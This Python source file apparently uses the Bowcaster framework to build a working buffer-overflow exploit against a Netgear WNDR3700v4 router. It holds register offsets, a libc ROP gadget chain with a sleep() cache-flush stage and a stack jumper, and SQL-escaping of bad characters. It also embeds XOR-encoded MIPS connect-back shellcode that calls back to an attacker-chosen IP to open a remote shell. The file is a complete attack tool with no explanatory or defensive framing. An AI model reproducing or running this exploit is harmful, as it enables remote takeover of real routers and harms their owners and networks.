from bowcaster.development.overflowbuilder import *
from bowcaster.common.support import BigEndian,Logging
from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
from bowcaster.encoders.mips import *

class WNDR3700v4_Overflow(object):
    #we can deal with these in the encoder
    BAD_CHARS=[0x0d,0x20,0x2d,0x00]
    #this one we have to SQL-escape
    SQL_BAD=BAD_CHARS+["\'"]
    
    @classmethod
    def sql_escape_overflow(cls,overflow_string):
        newstring=""
        escaped_chars={}
        for char in parse_badchars(cls.BAD_CHARS):
            num=ord(char)
            esc="\'||x\'%02x\'||\'" % num
            escaped_chars[char]=esc
            
        for char in overflow_string:
            if char in escaped_chars:
                newstring+=escaped_chars[char]
            else:
                newstring+=char
        
        return newstring
                
            
    def __init__(self,connectback_ip,logger=None):
        if not logger:
            self.logger=Logging()
        else:
            self.logger=logger
            
        self.connectback_ip=connectback_ip
        self.overflow=self.build_overflow()
        
    
    def build_overflow(self):
        ra=188
        fp=184
        s7=180
        s6=176
        s5=172
        s4=168
        s3=164
        s2=160
        s1=156
        s0=152
        #after indirect return
        ra_2=228
        s2_2=224
        s1_2=220
        
        libc_base=0x2adbe000
        SC=SectionCreator(BigEndian,base_address=libc_base,badchars=self.__class__.BAD_CHARS)
        SC.gadget_section(140,0x2AAACBC0,
                            description="A library address that can be derefed without crashing.",
                            base_address=0)
        SC.gadget_section(s1_2,0x2AAACBC0,
                            description="An read-only address that can be derefed by stackjumper.",
                            base_address=0)                    

        SC.gadget_section(ra,0x0005A840,
                            description="[$s2] stage 1 sec arg to sleep(), jalr $s1")


        SC.gadget_section(s1,0x0004041C,
                            description="[$ra] Stage return address for sleep(). jalr $s2")
                            
        
        SC.gadget_section(s2,0x000595C0,
                            description="[$s1] sleep() in order to force context switch and flush d-cache.")
                            
        SC.gadget_section(ra_2,0x0001FB1C,"[$ra] stackfinder. $s0,$s2,$s4 get offset+$sp.  jalr $s6")
        
        SC.gadget_section(s6,0x00011A14,"[$s6] stack jumper. jalr $s2.")
        
        self.logger.LOG_DEBUG("Bulding payload with connect-back IP: %s" % self.connectback_ip)
        payload=ConnectbackPayload(self.connectback_ip,BigEndian)
        encoded_payload=MipsXorEncoder(payload,key=0xecb9dcb4,badchars=self.__class__.BAD_CHARS)
        SC.string_section(704,encoded_payload.shellcode,"XOR-encoded connect-back payload.")
                           
        buf=OverflowBuffer(BigEndian,1324,SC.section_list)
        
        
        return buf